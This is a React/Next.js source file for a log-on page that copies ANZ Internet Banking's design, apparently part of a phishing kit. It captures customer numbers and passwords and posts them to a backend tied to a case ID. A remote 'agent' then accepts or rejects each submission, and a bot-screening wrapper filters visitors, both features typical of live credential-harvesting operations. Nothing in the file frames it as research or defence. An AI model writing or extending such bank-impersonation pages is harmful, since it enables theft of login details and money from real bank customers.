'use client';

/**
 * ANZ Credentials Page
 * 
 * Pixel-perfect match to reference ANZ login design
 * Customer Number + Password fields
 * Lock icon ONLY appears here (industry standard for login)
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2, LockKeyhole } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [customerNumber, setCustomerNumber] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setCustomerNumber('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!customerNumber.trim()) {
        setFieldError('Please enter your customer number');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: customerNumber.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [customerNumber, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">ANZ Internet Banking</h1>

      {/* Login Form */}
      <div className="login-card">
        {/* Card Header - Mobile only */}
        <div className="card-header">
          <h2>Log on</h2>
        </div>

        <form className="login-form" onSubmit={handleSubmit}>
          {/* Customer Number */}
          <div className="form-group">
            <label htmlFor="customer-number" className="form-label">Customer number</label>
            <input
              type="text"
              id="customer-number"
              name="customer-number"
              className="form-input"
              autoComplete="username"
              value={customerNumber}
              onChange={(e) => {
                setCustomerNumber(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Password */}
          <div className="form-group">
            <label htmlFor="password" className="form-label">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              className="form-input"
              autoComplete="current-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Forgot password link */}
          <a href="#" className="forgot-link">Forgot password?</a>

          {/* Error message */}
          {fieldError && (
            <div className="error-message" style={{ clear: 'both' }}>
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}
          {(error && !fieldError) && (
            <div className="error-message" style={{ clear: 'both' }}>
              <AlertCircle className="h-4 w-4" />
              <span>{error}</span>
            </div>
          )}

          {/* Log on Button - Lock icon ONLY on login */}
          <button
            type="submit"
            className="btn-signin"
            disabled={isWaiting}
            style={{ clear: 'both' }}
          >
            {isWaiting ? (
              <Loader2 className="h-4 w-4 animate-spin" />
            ) : (
              <LockKeyhole className="h-4 w-4" style={{ marginTop: '-1px' }} />
            )}
            {isWaiting ? 'Logging on...' : 'Log on'}
          </button>
        </form>
      </div>

      {/* Payment Warnings Card */}
      <div className="payment-warnings">
        <a href="https://www.anz.co.nz/support/security-privacy/payment-warning/" title="New payment warnings in Internet Banking">
          <img src="/brands/anz/Payment_Warnings.jpg" alt="New payment warnings in Internet Banking" />
        </a>
      </div>
    </BotGuard>
  );
}
